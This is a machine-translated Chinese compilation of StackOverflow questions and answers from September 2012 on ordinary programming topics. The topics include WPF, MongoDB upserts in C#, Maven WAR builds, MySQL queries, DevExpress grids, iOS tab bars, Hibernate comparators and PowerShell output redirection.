# StackOverflow 问答 12460000-12460999

# c# - 值不会在事件中改变

> ID：12460001
> 
> 赞同：0
> 
> 时间：2012-09-17T13:15:00.530
> 
> 标签：c#, wpf, list

我在 wpf 中创建了一个画布列表，并且我有一个按钮单击事件。我希望当我按下按钮时它会添加到列表中的新画布。但是当我尝试在另一个窗口中更改画布的属性时，它说索引超出范围，这意味着列表没有添加画布。我创建了一个方法来检查它，实际上它说索引是 0。我也有一个数组，同样在这里，我更改了它的值，但它仍然写的值为 0。这是代码：

```
public partial class New_Paint : Window
{
    public List<Canvas> paintsList = new List<Canvas>();
    public Canvas painting = new Canvas();

    private void ok_MouseUp(object sender, MouseButtonEventArgs e)
    {
        paintsList.Add(painting);
        this.Close();
    }
} 
```

这是检查其大小的方法：

```
public int getSize()
{
    return paintsList.Count;
} 
```

这是主窗口中的代码：

```
private void button1_Click(object sender, RoutedEventArgs e)
{
    textBox1.Text = paint.getSize() + "";
} 
```

尽管我单击“确定”，但方法返回 0。该列表不会添加项目。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T13:29:23.213

我认为你是新来的？您的画布列表属于您的 New_Paint 实例，您只需在关闭窗口之前将一个画布添加到该列表中（至少在您显示的代码中）。我不明白你为什么期望不止一个。您需要拥有一个由管理您的子窗口的任何事物所拥有的画布主列表。

# iphone - 这里哪种设置更有效？

> ID：12460003
> 
> 赞同：0
> 
> 时间：2012-09-17T13:15:13.230
> 
> 标签：iphone, objective-c, c, jailbreak, dylib

Objective-C / iPhone / 越狱开发

我正在构建一个代码量可能会增加的程序，因为它是一种基于 API 的可扩展程序。（想想插件）

我有两个选择，将不断增长的代码保留在可执行文件中（变得混乱）或将其放在单独的动态库中。

如果我采用动态库方法，我将拥有大约 20 多个动态库，主程序将同时打开它们。这效率如何？同时打开大量动态库是否有任何限制或性能劣势？

我对 Objective-C 的经验水平适中，所以我什么都不知道。:P

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:23:27.040

> 一种基于 API 的可扩展程序。（想想插件）

不确定是哪种方式-插件通常必须动态引用，否则它们是-“编译器”-因此动态库是要走的路。

> 我有两个选择，将不断增长的代码保留在可执行文件中

实际上，在真正的插件架构中，如果这确实是您的目标，您不能将其保留在可执行文件中以允许人们动态加载插件。

其次 - 你如何考虑你的代码库并不是你的部署布局所固有的。类是类层是层，无论它是在可执行文件中还是加载到框架或库中。你只是想不同而已。

> （变得凌乱）或将其放置在单独的动态库中。

如果你有一个插件类型的架构，你应该使用库或编译时框架。

现代应用程序进程加载大量库，一个插件类型的项目假设可能有数百个库，但您不知道任何时候会加载哪些库（相当少）。

使用库对您有利。

# c# - 在 mongodb 中执行高效的 upsert

> ID：12460005
> 
> 赞同：2
> 
> 时间：2012-09-17T13:15:18.940
> 
> 标签：c#, .net, mongodb

我有以下 C# 模型类：

```
public class Thingy
{        
    public ObjectId Id { get; set; }        
    public string Title { get; set; }
    public DateTime TimeCreated { get; set; }
    public string Content { get; set; }
    public string UUID { get; set; }
} 
```

以及以下 ASP.MVC 控制器操作：

```
public ActionResult Create(Thingy thing)
{
    var query = Query.EQ("UUID", thing.UUID);
    var update = Update.Set("Title", thing.Title)
        .Set("Content", thing.Content);

    var t = _collection.Update(query, update, SafeMode.True);
    if (t.UpdatedExisting == false)
    {
        thing.TimeCreated = DateTime.Now;
        thing.UUID = System.Guid.NewGuid().ToString();
        _collection.Insert(thing);
    }

        /*
        var t = _collection.FindOne(query);

        if (t == null)
        {
            thing.TimeCreated = DateTime.Now;
            thing.UUID = System.Guid.NewGuid().ToString();
            _collection.Insert(thing);                
        }
        else
        {
            _collection.Update(query, update);                
        }
        */
        return RedirectToAction("Index", "Home");
    } 
```

此方法执行更新或插入。如果需要进行插入，则必须设置 UUID 和 TimeCreated 成员。如果需要进行更新，则必须单独保留 UUID 和 TimeCreated，但必须更新成员 Title 和 Content。

注释掉的代码有效，但似乎不是最有效的。当它调用 FindOne 时，即是对 mongodb 的一次访问。然后，如果它转到 else 子句，它会执行另一个查询和一个更新操作，因此又是 2 次到 mongodb 的行程。

什么是更有效的方法来完成我想要完成的事情？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T16:13:05.283

如链接的 SO 答案中所述，要使 upserts 起作用，您需要更新整个文档，而不仅仅是几个属性。

就我个人而言，我会将`Create`and`Edit`分成单独的 MVC 操作。建议零售价。创建一个`Thingy`与更新它有不同的考虑。

如果您仍想执行 upsert 而不是单独的插入/更新调用，则需要使用以下代码：

```
_collection.Update(
    Query.EQ("UUID", thing.UUID),
    Update.Replace(thing),
    UpsertFlags.Upsert
); 
```

现在的问题变成了，我们如何确保这`thing`两种情况都具有适当的值，即插入和更新。

我的假设是（基于您的代码模型绑定到`Thingy`实例），您的视图正在发回所有字段（包括`UUID`and `TimeCreated`）。这意味着，在更新的情况下，视图已经预先填充了`UUID`和的值`TimeCreated`。因此，在`Thingy`更新的情况下，`thing`对象具有最新的值。

现在，在创建的情况下，当呈现视图时，您可以存储`DateTime.MinValue`该`TimeCreated`字段。在您的`Create`MVC 操作中，您可以检查是否`TimeCreated`为`DateTime.MinValue`，然后将其设置为当前时间并为`UUID`.

这样，在插入的情况下，`thing`也具有最新值。因此，我们可以安全地进行 Upsert。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-06-06T21:08:59.647

我在从控制器为 Mongo 做 upserts 时采用这种方法

```
public ActionResult Create(Thingy model)
{
    var thing = _collection.FindOneAs<Thingy>(Query.EQ("UUID", model.UUID));
    if(thing == null)
    {
       thing = new Thingy{
                         TimeCreated = DateTime.Now,
                         UUID = System.Guid.NewGuid().ToString(),
                         Id = ObjectId.GenerateNewId()
                        }
    }
    else 
    {
       thing.Content = model.Content;
       //other updates here
    }

    _collection.Save<Thingy>(thing);
    return View();
} 
```

# java - Maven：创建2个war文件，每个文件都有不同的web.xml？

> ID：12460007
> 
> 赞同：3
> 
> 时间：2012-09-17T13:15:24.723
> 
> 标签：java, maven, war, maven-war-plugin

我需要`web.xml`使用 Maven 创建两个带有两个不同文件的 WAR 文件。WAR 文件在其他方面是相同的。

WAR 文件按预期创建，但是，第二个文件与第一个文件具有相同的`web.xml`文件。

如何强制 Maven WAR 插件将第二个文件用于第二个 WAR？我不能使用配置文件，因为我需要一次创建两个文件。

我当前的代码：

```
<plugin>
  <groupId>org.apache.maven.plugins</groupId>
  <artifactId>maven-war-plugin</artifactId>
  <version>2.2</version>
  <configuration>
    <warSourceDirectory>${basedir}/WEB</warSourceDirectory>
    <warName>main</warName>
    <webXml>${basedir}/CONF/web.xml</webXml>
  </configuration>
  <executions>
    <execution>
      <id>hist-war</id>
      <phase>package</phase>
      <goals>
        <goal>war</goal>
      </goals>
      <configuration>
        <warName>hist</warName>
        <warSourceDirectory>${basedir}/WEB</warSourceDirectory>
        <webXml>${basedir}/CONF/hist.web.xml</webXml>
      </configuration>
    </execution>
  </executions>
</plugin> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-17T13:36:59.773

使用[Maven WAR 插件的](http://maven.apache.org/plugins/maven-war-plugin/)[覆盖](http://maven.apache.org/plugins/maven-war-plugin/overlays.html)特性。

您需要两个 WAR 项目。第一个是您的原始文件，其`web.xml`文件位于正确的位置。这在配置方面没有任何特定需求。只需确保它按照您的预期构建即可。

第二个只包含它的 POM 和目录`web.xml`中的备用`WEB-INF`。该项目的 POM 必须包含对第一个项目的依赖项，其类型指定为 war，范围指定为运行时。您不需要显式配置 Maven WAR 插件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T13:34:13.587

似乎有各种使用战争插件的陷阱。在这种情况下，我将只使用 2 个单独的子模块来构建适当的战争。

# mysql - mysql左连接子选择

> ID：12460008
> 
> 赞同：1
> 
> 时间：2012-09-17T13:15:25.877
> 
> 标签：mysql, database, select

我有这种格式的表格：

```
tag | item
----------
1   | 1
2   | 2
2   | 3
3   | 1
3   | 2
3   | 3 
```

我必须选择那些标签，它们存在于每个项目的一组项目中。

例如：

items={2,3} --> tags{2,3}，item 2有tags 2,3，item 3有tags 2,3，常见的tags是2,3

items={1,2,3} --> tags{}，item 1有tags 1,3，item 2有tags 2,3，item 3有tags 2,3，常用标签是3

items={1,3} --> tags{3}，item 1有tags 1,3，item 3有tags 2,3，常见的tags是3

作为输入，我有一组项目。我不知道如何编写这样的查询。

感谢您的回复。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:31:17.967

我认为您正在寻找共享相同标签的项目列表，对吗？

此查询应该为您完成。它由将每个项目的标签组合在一起的内部摘要查询和将共享标签组的项目组合在一起的外部摘要查询组成。

```
SELECT GROUP_CONCAT(item ORDER by ITEM) items, tags
  FROM (
           SELECT GROUP_CONCAT(tag ORDER BY tag) tags, item
             FROM tbl
         GROUP BY item
        )t
  GROUP BY tags
  ORDER BY tags 
```

对于您问题中的测试数据集，它会返回：

```
| ITEMS | TAGS |
----------------
|     1 |  1,3 |
|   2,3 |  2,3 | 
```

也就是说，您的项目 1 具有标签 1 和 3。您的项目 2 和 3 具有标签 2 和 3。

去拉小提琴！[http://sqlfiddle.com/#!2/6a927/3/0](http://sqlfiddle.com/#!2/6a927/3/0)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T14:04:41.073

解决您的问题的查询是（假设标签和项目没有重复的条目）

```
SELECT tag FROM <table_name>
WHERE item IN (<items to be searched seperated by ,>)
GROUP BY tag
HAVING COUNT(*) = <number of items>; 
```

例如对于项目 {1,3}

```
SELECT tag FROM <table_name>
WHERE item IN (1,3)
GROUP BY tag
HAVING COUNT(*) = 2; 
```

对于项目 {1,2,3}

```
SELECT tag FROM <table_name>
WHERE item IN (1,2,3)
GROUP BY tag
HAVING COUNT(*) = 3; 
```

要查看以逗号分隔的结果，请使用以下查询

```
SELECT GROUP_CONCAT(a.tag) FROM (
SELECT tag FROM <table_name>
WHERE item IN (<items to be searched seperated by comma>)
GROUP BY tag
HAVING COUNT(*) = <no. of items>) AS a; 
```

希望能帮助到你...

# windows-phone-7 - 有关 XAML Windows Phone 7 中的 UICreation 的问题

> ID：12460010
> 
> 赞同：0
> 
> 时间：2012-09-17T13:15:32.373
> 
> 标签：windows-phone-7, windows-phone-7.1

我创建了 XAML，具有网格结构，具有 3 或 4 行，每行包含两列，如果我想为每行和每行和每列周围的边界线设置颜色，我该如何实现它。

我特别是 XAML 中的这个 Ui 创建的新手，关于如何实现这一点的任何想法都会很有用`

```
 <TextBlock Foreground="Black"  Text="Account Number :"   Margin="10" Grid.ColumnSpan="2"  />
                    <TextBlock Foreground="Black" x:Name="accNO" Text="" Grid.Column="2" Margin="10"/>

                    <TextBlock Foreground="Black" Text="Currency  :" Grid.Row="1" Margin="10" Grid.ColumnSpan="2" />
                    <TextBlock Foreground="Black" x:Name="accCurr" Text="" Grid.Row="1" Grid.Column="2" Margin="10"/>
                    <TextBlock Foreground="Black" Text="Acount Balance  :" Grid.Row="2" Margin="10" Grid.ColumnSpan="2" />
                    <TextBlock Foreground="Black" x:Name="accOBal" Text="" Grid.Row="2" Grid.Column="2" Margin="10"/>
                    <TextBlock Foreground="Black" Text="Available Balance :" Grid.Row="3" Margin="10" Grid.ColumnSpan="2" />
                    <TextBlock Foreground="Black" x:Name="avBal" Text="" Grid.Row="3" Grid.Column="2" Margin="10"/>

                </Grid>` 
```

我已经更新了获取表格的代码作为我的要求

```
 <Border Grid.Row="0" Grid.Column="0" Grid.ColumnSpan="2" BorderThickness="1" BorderBrush="White">
                        <Border.Background>
                            <LinearGradientBrush EndPoint="1,0" StartPoint="1,1">
                                <GradientStop Color="LightGray" Offset="0" />
                                <GradientStop Color="LightGray" Offset="1" />
                            </LinearGradientBrush>                           
                        </Border.Background>
                        <TextBlock Foreground="Black"  Text="Account Number :"   Margin="10" Grid.ColumnSpan="2"  />
                    </Border>

                    <Border Grid.Row="0" Grid.Column="2" BorderThickness="1" BorderBrush="White">
                        <TextBlock Foreground="Black" x:Name="accNO" Text="" Grid.Column="2" Margin="10"/>
                    </Border> 
```

感谢您的帮助。它是为第一行网格完成的。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T13:31:21.617

如果要在每行和每列周围设置边框，请在每行和每列内设置 Border 元素

```
<Border Grid.Row="2" Grid.Column="1" BorderThickness="1" BorderBrush="White">
    <TextBlock Text="This is some text." />
</Border> 
```

# asp.net - 编辑单元格时在 ASPxGridView 中将文本框右对齐

> ID：12460012
> 
> 赞同：0
> 
> 时间：2012-09-17T13:15:34.633
> 
> 标签：asp.net, vb.net, devexpress, aspxgridview

我有一个带有一些列的 ASPxGridView。

当我选择一行并进入编辑模式时，我希望这 3 个复选框（红色的）右对齐而不是左对齐：

![在此处输入图像描述](../Images/85a2531fce7f493c9e47300368c5d7fc.png)

我只是找不到正确的属性来对齐它们（或者我做错了什么，也许？）。

这是我的 ASPxGridView 的代码。

```
<dx:ASPxGridView ID="grdxFornecedor"  runat="server" AutoGenerateColumns="False" Border-BorderStyle="None"
                Border-BorderWidth="0px" Paddings-Padding="0" SettingsBehavior-AllowSort="true" 
                KeyFieldName="IdFornecedor" Style="margin-right: 0px" 
       ClientInstanceName="grid" Width="975px" >                

     <Paddings Padding="0px" />
    <ClientSideEvents RowClick="function(s, e) {                    
        //s.StartEditRow(e.visibleIndex);
     }" 
    />

     <ClientSideEvents RowDblClick="function(s,e){
        //alert(s.GetFocusedRowIndex());
        //alert(s.GetRowKey(e.visibleIndex));
        //alert(s.GetRowKey(e.htmlEvent.srcElement.cellIndex));
        if(e.htmlEvent.srcElement.cellIndex == 0 || e.htmlEvent.srcElement.cellIndex == 1 ){
            window.open('../Item/Consulta.aspx?Ant=Pl&DETALHE=TRUE&ID_ITEM='+s.GetRowKey(e.visibleIndex),'_blank');
        }
    }"
    />
    <ClientSideEvents EndCallback="OnEndCallback" BeginCallback="OnBeginCallback"/>

    <SettingsCustomizationWindow Enabled="True" PopupVerticalAlign="Below" PopupHorizontalAlign="LeftSides" />

    <Styles>
        <AlternatingRow Enabled="True" CssClass="GridImpar">
        </AlternatingRow>
        <Header CssClass="GridHeader">
        </Header>
        <Row CssClass="GridPar">
        </Row>
    </Styles>
    <Columns>                    
        <dx:GridViewDataTextColumn Caption="FORN-COD" FieldName="CdFornecedor" ToolTip="Código do Fornecedor"
                        HeaderStyle-HorizontalAlign="Center" VisibleIndex="0" SortIndex="0" SortOrder="Ascending" >
                        <EditFormSettings Visible="False" />
                        <HeaderStyle HorizontalAlign="Left" ForeColor="White" Paddings-Padding="3" 
                            SortingImageSpacing="3">
                            <Paddings Padding="3px" />
                            <Border BorderStyle="None" BorderWidth="0px" />
                        </HeaderStyle>
                        <CellStyle HorizontalAlign="Left">
                            <Border BorderStyle="None" BorderWidth="0px" />
                        </CellStyle>
                    </dx:GridViewDataTextColumn>
                    <dx:GridViewDataTextColumn Caption="FORN-NOM" 
            FieldName="DsFornecedor" ToolTip="Nome do Fornecedor"
                        HeaderStyle-HorizontalAlign="Center" VisibleIndex="1" 
            Width="318px">
                        <EditFormSettings Visible="False" />
                        <HeaderStyle HorizontalAlign="Left" ForeColor="White" Paddings-Padding="3" 
                            SortingImageSpacing="3">
                            <Paddings Padding="3px" />
                            <Border BorderStyle="None" BorderWidth="0px" />
                        </HeaderStyle>
                        <CellStyle HorizontalAlign="Left">
                            <Border BorderStyle="None" BorderWidth="0px" />
                        </CellStyle>
                    </dx:GridViewDataTextColumn>
                    <dx:GridViewDataTextColumn Caption="FORN-IQF" FieldName="NrIqf"
                        ToolTip="IQF do fornecedor" HeaderStyle-HorizontalAlign="Center" VisibleIndex="2"
                        PropertiesTextEdit-DisplayFormatString="{0}%">
                        <PropertiesTextEdit DisplayFormatString="{0}%">
                        </PropertiesTextEdit>
                        <EditFormSettings Visible="False" />
                        <HeaderStyle HorizontalAlign="Right" ForeColor="White" Paddings-Padding="3" 
                            SortingImageSpacing="3">
                            <Paddings Padding="3px" />
                            <Border BorderStyle="None" BorderWidth="0px" />
                        </HeaderStyle>
                        <CellStyle HorizontalAlign="Right">
                            <Border BorderStyle="None" BorderWidth="0px" />
                        </CellStyle>
                    </dx:GridViewDataTextColumn>
                    <dx:GridViewDataTextColumn Caption="FORN-IQF Ajuste" FieldName="NrIqfAjuste" ToolTip="IQF de ajuste do fornecedor" HeaderStyle-HorizontalAlign="Center" 
                        VisibleIndex="3">
                        <PropertiesTextEdit DisplayFormatString="{0}%" MaskSettings-Mask="###" 
                            FocusedStyle-HorizontalAlign="Right" Style-HorizontalAlign="Right" >
                            <MaskSettings Mask="###" />
                            <FocusedStyle HorizontalAlign="Right">
                            </FocusedStyle>
                        </PropertiesTextEdit>
                        <EditFormSettings Visible="False" />
                        <HeaderStyle HorizontalAlign="Right" ForeColor="White" Paddings-Padding="3" 
                            SortingImageSpacing="3">
                            <Paddings Padding="3px" />
                            <Border BorderStyle="None" BorderWidth="0px" />
                        </HeaderStyle>
                        <CellStyle HorizontalAlign="Right">
                            <Border BorderStyle="None" BorderWidth="0px" />
                        </CellStyle>
                    </dx:GridViewDataTextColumn>
                    <dx:GridViewDataTextColumn Caption="FORN-DS" FieldName="DsConceitoFornecedor" ToolTip="Conceito do Fornecedor"
                        HeaderStyle-HorizontalAlign="Center" VisibleIndex="4">
                        <EditFormSettings Visible="False" />
                        <HeaderStyle HorizontalAlign="Right" ForeColor="White" Paddings-Padding="3" 
                            SortingImageSpacing="3">
                            <Paddings Padding="3px" />
                            <Border BorderStyle="None" BorderWidth="0px" />
                        </HeaderStyle>
                        <CellStyle HorizontalAlign="Right">
                            <Border BorderStyle="None" BorderWidth="0px" />
                        </CellStyle>
                    </dx:GridViewDataTextColumn>
                    <dx:GridViewDataTextColumn Caption="FORN-TAK" FieldName="NrTempoRespostaAceiteKanban" ToolTip="Tempo de resposta aceite do Kanban"
                        HeaderStyle-HorizontalAlign="Center" VisibleIndex="5" >
                        <PropertiesTextEdit DisplayFormatString="" MaskSettings-Mask="#.##" Style-HorizontalAlign="Right">
                            <MaskSettings Mask="#.##" />
                        </PropertiesTextEdit>
                        <HeaderStyle HorizontalAlign="Right" ForeColor="White" Paddings-Padding="3" 
                            SortingImageSpacing="3">
                            <Paddings Padding="3px" />
                            <Border BorderStyle="None" BorderWidth="0px" />
                        </HeaderStyle>
                        <CellStyle HorizontalAlign="Right">
                            <Border BorderStyle="None" BorderWidth="0px" />
                        </CellStyle>
                    </dx:GridViewDataTextColumn>
                    <dx:GridViewDataTextColumn Caption="FORN-TT" FieldName="NrTempoTransito" ToolTip="Tempo de trânsito"
                        HeaderStyle-HorizontalAlign="Center" VisibleIndex="5">
                        <PropertiesTextEdit DisplayFormatString="" MaskSettings-Mask="#.##"  Style-HorizontalAlign="Right">
                            <MaskSettings Mask="#.##" />
                        </PropertiesTextEdit>
                        <HeaderStyle HorizontalAlign="Right" ForeColor="White" Paddings-Padding="3" 
                            SortingImageSpacing="3">
                            <Paddings Padding="3px" />
                            <Border BorderStyle="None" BorderWidth="0px" />
                        </HeaderStyle>
                        <CellStyle HorizontalAlign="Right">
                            <Border BorderStyle="None" BorderWidth="0px" />
                        </CellStyle>
                    </dx:GridViewDataTextColumn>

        <dx:GridViewCommandColumn  ButtonType="Image" Caption="Ação" VisibleIndex="15" Width="40px">

            <EditButton Visible="True" >
                <Image Url="~/Library/Images/Alterar.png" ToolTip="Alterar">
                </Image>
            </EditButton>
            <CancelButton Image-Url="~/Library/Images/Cancelar.png" Image-ToolTip="Cancelar">
                <Image ToolTip="Cancelar" Url="~/Library/Images/Cancelar.png">
                </Image>
            </CancelButton>
            <UpdateButton Image-Url="~/Library/Images/Salvar.png" Image-ToolTip="Salvar" >
                <Image ToolTip="Salvar" Url="~/Library/Images/Salvar.png">
                </Image>
            </UpdateButton>

            <HeaderStyle HorizontalAlign="Center" ForeColor="White" Paddings-Padding="3" SortingImageSpacing="3">
                <Paddings Padding="3px" />
                <Border BorderStyle="None" BorderWidth="0px" />
            </HeaderStyle>
            <CellStyle>
                <Border BorderStyle="None" BorderWidth="0px" />
            </CellStyle>
        </dx:GridViewCommandColumn>
    </Columns>
    <Border BorderStyle="None" BorderWidth="0px" />            
</dx:ASPxGridView> 
```

有任何想法吗？

谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T15:45:16.493

尝试在列上设置 EditCellStyle-Horizo​​ntalAlign 属性，如下所示：

```
<dx:GridViewDataTextColumn>
    <EditCellStyle HorizontalAlign="Left"/>
    ...
</dx:GridViewDataTextColumn> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-07-09T17:33:43.707

您可以为所有列设置默认对齐方式，然后为您想要的每一列设置自定义样式：

```
<dx:ASPxGridView Styles-InlineEditCell-HorizontalAlign="Center">
     <dx:GridViewDataTextColumn EditCellStyle-HorizontalAlign="Right" />
<dx:ASPxGridView/> 
```

或者，如果您想使用 BatchEdit 模式：

```
<dx:ASPxGridView Styles-BatchEditCell-HorizontalAlign="Center">
     <dx:GridViewDataTextColumn EditCellStyle-HorizontalAlign="Right" />
<dx:ASPxGridView/> 
```

但请注意 DataCheckColumn 存在问题：

> *...复选框编辑器呈现在浏览和编辑模式下是不同的（在浏览模式下，它呈现为只读，在编辑 - 作为可点击）...*
> 
> 来源：[T108471](https://www.devexpress.com/Support/Center/Question/Details/T108471)

# iphone - 删除 uitabbar 控制器

> ID：12460013
> 
> 赞同：-1
> 
> 时间：2012-09-17T13:15:41.200
> 
> 标签：iphone, objective-c, ios, xcode

我是 iPhone 开发的新手，我的问题是`UITabbar`我的应用程序中有一个。它会在登录后显示。当我想从我的应用程序中注销时，想要返回登录视图控制器，因此应该从显示的登录视图控制器中删除标签栏。那么我该怎么做呢？

我尝试隐藏标签栏，但没有奏效。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T13:27:17.040

在 appdelegate 中将 loginView 设置为 rootView 控制器，登录后将 tabBar 设置为 rootView 并在注销时从 rootView 中删除 tabBar 并将 loginView 设置为 rootView。

或者

在 .h 文件中

```
@property (nonatomic,retain) UITabBarController *yourTabBar; 
```

在应用程序委托中添加 tabBar 实例的功能`-(void)addTabBar`此方法将您的所有视图添加到 tabBar，不要将此作为子视图添加到窗口，只需制作即可。并将您的 LoginView 添加为 rootViewController。

登录后将 tabBar 添加为 subView

```
TUTAppDelegate *appdelegte =(TUTAppDelegate*)[[UIApplication sharedApplication]delegate];

[[appdelegte window]addSubview:[[appdelegte yourTabBar]view]]; 
```

并在注销按钮处

```
TUTAppDelegate *appDelegate = (TUTAppDelegate *)[[UIApplication sharedApplication] delegate];
[[[appDelegate yourTabBar] view]removeFromSuperview] 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-18T06:18:02.183

这是我的登录按钮操作如何将其放入 appdelegate 以及是否将 appdelegate 放入登录按钮

```
UITabBarController *tabBarController = [[UITabBarController alloc] init ];

                    UINavigationController *statusNavigationController = [[UINavigationController alloc] init];
                    StatusViewController *statusViewController = [[StatusViewController alloc] initWithNibName:@"StatusViewController" bundle:nil];
                    statusViewController.title = @"Status";

                      statusViewController.tabBarItem.image = [UIImage imageNamed:@"status.PNG"];
                    statusViewController.searchText=@"";
                    [statusNavigationController pushViewController:statusViewController animated:YES];

                    UINavigationController *messageNavigationController = [[UINavigationController alloc] init];
                    MessageViewController *messageViewController = [[MessageViewController alloc] initWithNibName:@"MessageViewController" bundle:nil];
                    messageViewController.title = @"Messages";
                    messageViewController.tabBarItem.image = [UIImage imageNamed:@"message.PNG"];

                    messageViewController.searchText=@"";
                    [messageNavigationController pushViewController:messageViewController animated:YES]

                    [tabBarController addChildViewController:statusNavigationController];
                    [tabBarController addChildViewController:messageNavigationController
                    [self.navigationController pushViewController:tabBarController animated:YES]; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-18T07:39:34.030

> 在不同的 View 或 Xib 中设置登录页面和下一页。
> 
> 给第 2 届 Xib 的 UITabbar。
> 
> 当 logOut 指向第一个 View。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-17T17:39:58.377

你试过在 TabBar 前面有一个 modalViewController 吗？

[UIViewController 类参考](http://developer.apple.com/library/ios/#documentation/uikit/reference/UIViewController_Class/Reference/Reference.html)

[关于视图控制器](http://developer.apple.com/library/ios/#featuredarticles/ViewControllerPGforiPhoneOS/Introduction/Introduction.html#//apple_ref/doc/uid/TP40007457)

# java - Java/休眠比较器

> ID：12460014
> 
> 赞同：1
> 
> 时间：2012-09-17T13:15:41.433
> 
> 标签：java, hibernate, comparison, compare

让我上课

```
class Foo 
```

并且有这个类的两个比较器

```
class Comparator1 implements Comparator<Foo>  
class Comparator2 implements Comparator<Foo> 
```

现在我在课堂`TreeSet`上使用对象。`Foo``Bar`

```
class Bar  
{  
   private SortedSet<Foo> foos = new TreeSet(new Comparator1());  
} 
```

在 xml 映射中

```
 <set name="foos"
     sort="com.package.Comparator2"
     fetch="subselect">
     <key column="column" not-null="true"/>
     <one-to-many class="Foo" />
  </set> 
```

从数据库加载集合后，休眠将使用哪个比较器，持久化后将使用哪个比较器？
我可以在本地修改中使用`Comparator1`，但用于加载和保存`Comparator2`？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T13:30:09.370

当 Hibernate 从 DB 加载实体时，任何集合都将被重写，因为它需要使用自己的 Set 实现。如果您创建了一个全新的对象并将其持久化，那么 Comparator1 仍在使用中，因为它仍然是您的集合，它不是 Hibernate 的代理。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T13:31:10.230

从我[在这里](http://parasjain.net/2008/11/10/sorting-hibernate-set-using-a-comparator/)读到的内容来看，数据库中的数据将使用排序`Comparator2`，当您加载数据时，它自然会使用`Comparator2`.

# iphone - 如何创建 Url Iphone SDK 数组

> ID：12460015
> 
> 赞同：0
> 
> 时间：2012-09-17T13:15:41.153
> 
> 标签：iphone, arrays, sdk

嗨，我想知道我该怎么做：

我有这个...

```
networkImages = [[NSArray alloc] initWithObjects:@"http:www.mydomain.com/photo.png", @"http:www.mydomain.com/photo2.png", @"http:www.mydomain.com/photo3.png", @"http:www.mydomain.com/photo4.png" ,nil]; 
```

我想知道我能不能做到这一点..

```
NSArray * photo;    
networkImages = [[NSArray alloc] initWithObjects: photo, nil]; 
```

我下载了使用 JSON 解析的 web 服务器上的照片数组。我试试这个，但我有一个错误

> 由于未捕获的异常“NSInvalidArgumentException”而终止应用程序，原因：“-[__NSArrayI 长度]：无法识别的选择器发送到实例 0x383940”

对不起我的英语！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T13:32:16.963

如果您只想要数组中的一个数组..试试这个

```
NSArray * photo;    
networkImages = [NSArray arrayWithArray: photo]; 
```

# powershell - Powershell：捕获组合输出，仅错误输出，将组合输出发送到控制台

> ID：12460018
> 
> 赞同：2
> 
> 时间：2012-09-17T13:15:47.177
> 
> 标签：powershell, io-redirection, tee

我正在创建一个 Powershell 脚本来运行一堆 scala 脚本（我有理由不使用构建工具）。我想以这种方式为所有这些编译生成输出：

1.  只是文件中的编译错误
2.  编译错误和标准输出合并在第二个文件中
3.  标准输出和编译错误也转到标准输出

我试过**tee**，**2>>**，甚至戳**-OutVariable**和**-ErrorVariable**（后两者似乎只适用于原生 Powershell 命令？）。我怀疑**tee**和重定向是某种组合的正确方法，但经过大量搜索后，我似乎找不到合适的论坛。

这是我当前的主循环，它只是重定向错误：

```
foreach($script in $scripts) {
    Write-Host scala $script
    scala -nocompdaemon $script 2>> _testerrors.txt
} 
```

第一行是让观看该过程的人可以看到正在发生的事情（似乎适当的发球/重定向/等会消除这种情况，作为副作用）。

感谢您的任何帮助/指点；我只是 Powershell 的一个普通用户。

**更新：**

更多的狩猎产生了以下结果：

```
foreach($script in $scripts) {
    Write-Host scala $script
    Write-Output "> scala $script" | Out-File ./_testoutput.txt -append
    scala -nocompdaemon $script 2>&1 | tee -Variable testout
    out-file ./_testoutput.txt -InputObject $testout -append
    Write-Output "--------------------" | Out-File ./_testoutput.txt -append
} 
```

事实证明，**tee**命令可以将文本发送到文件，但由于某些奇怪的原因，它无法*附加*到文件中。因此，您必须在变量中捕获输出，然后将变量附加到文件中。

虽然这个结果确实解决了我的一些问题，但它仍然没有生成*只*包含错误消息的文件。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T17:25:45.910

你可以这样做：

```
$Error.Clear()
scala -nocompdaemon $script 2>&1 | Tee -FilePath output.txt -Append
$Error >> errors.txt 
```

如果您`$Error`先清除全局集合，那么当您执行循环时，它应该只包含由 scala 命令生成的错误。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-18T06:45:30.987

可能是您所追求的，请尝试 Start/Stop-Transcript [http://technet.microsoft.com/en-us/magazine/ff687007.aspx](http://technet.microsoft.com/en-us/magazine/ff687007.aspx) 但请注意，某些本机可执行文件存在问题，这是一种解决方法：http: [//blogs.msdn.com/b/powershell/archive/2010/01/04/workaround-for-start-transcript-on-native-processes.aspx](http://blogs.msdn.com/b/powershell/archive/2010/01/04/workaround-for-start-transcript-on-native-processes.aspx)

# java - 如何在击键或键绑定上调用操作

> ID：12460026
> 
> 赞同：0
> 
> 时间：2012-09-17T13:16:06.723
> 
> 标签：java

> **可能重复：**
> [如何在控制台应用程序中监听键盘事件](https://stackoverflow.com/questions/9075769/how-to-listen-to-keyboard-events-in-a-console-application)

嗨，我是 java 语法的新手。我正在尝试对击键调用一个操作，例如“ENTER 键”

例如：

```
on pressing Enter key {
    int c = 9+8 ;    //This should run on pressing enter key but not just running program directly
    printf("c");
} 
```

我已经引用了一些与此相关的 java doc 并尝试执行代码。但我遇到的语法错误很少。谁能举个直接的例子

* * *

